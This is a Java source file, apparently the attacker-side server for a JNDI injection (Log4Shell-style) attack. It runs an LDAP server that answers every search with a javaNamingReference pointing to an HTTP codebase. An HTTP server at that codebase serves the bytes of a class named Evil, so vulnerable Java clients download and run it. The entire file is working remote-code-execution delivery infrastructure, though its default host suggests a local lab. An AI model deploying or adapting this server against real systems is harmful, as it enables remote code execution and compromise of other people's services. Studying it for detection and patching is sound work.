import com.sun.net.httpserver.HttpServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import java.io.DataInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.util.Optional;

import static java.util.concurrent.Executors.newCachedThreadPool;

public class Main {
    private final static int LDAP_PORT = 9999;
    private final static int HTTP_PORT = 8888;

    public static void main(String[] args) throws IOException, LDAPException {
        String httpServerUrl = Optional
                .ofNullable(System.getenv("HTTP_SERVER_HOST"))
                .orElse("http://host.docker.internal:8888/");

        runLdapServer(httpServerUrl);
        runHttpServer();
    }

    private static void runLdapServer(String httpServerUrl) throws LDAPException {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("DC=malicious");

        config.setListenerConfigs(new InMemoryListenerConfig("listen", null, LDAP_PORT, null, null, null));
        config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
            @Override
            public void processSearchResult(InMemoryInterceptedSearchResult result) {
                System.out.println("Send LDAP response for " + result.getRequest());

                Entry entry = new Entry(result.getRequest().getBaseDN());

                entry.addAttribute("javaClassName", Evil.class.getName());
                entry.addAttribute("javaCodeBase", httpServerUrl);
                entry.addAttribute("objectClass", "javaNamingReference");
                entry.addAttribute("javaFactory", Evil.class.getName());

                try {
                    result.sendSearchEntry(entry);
                } catch (LDAPException e) {
                    e.printStackTrace();
                }

                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }
        });

        InMemoryDirectoryServer directoryServer = new InMemoryDirectoryServer(config);
        directoryServer.startListening();

        System.out.println("LDAP server listening on 0.0.0.0:" + LDAP_PORT);
    }

    private static void runHttpServer() throws IOException {
        byte[] evilPayload = readEvilClass();
        HttpServer server = HttpServer.create(new InetSocketAddress(HTTP_PORT), 0);

        server.createContext("/", exchange -> {
            System.out.println("Send HTTP response for " + exchange.getRequestURI());

            exchange.sendResponseHeaders(200, evilPayload.length);

            OutputStream os = exchange.getResponseBody();
            os.write(evilPayload);
            os.close();
        });
        server.setExecutor(newCachedThreadPool());
        server.start();

        System.out.println("HTTP server listening on 0.0.0.0:" + HTTP_PORT);
    }

    private static byte[] readEvilClass() throws IOException {
        DataInputStream dataInputStream = new DataInputStream(
                Evil.class.getResourceAsStream(Evil.class.getName() + ".class"));

        byte[] bytes = new byte[dataInputStream.available()];
        dataInputStream.readFully(bytes);

        return bytes;
    }
}
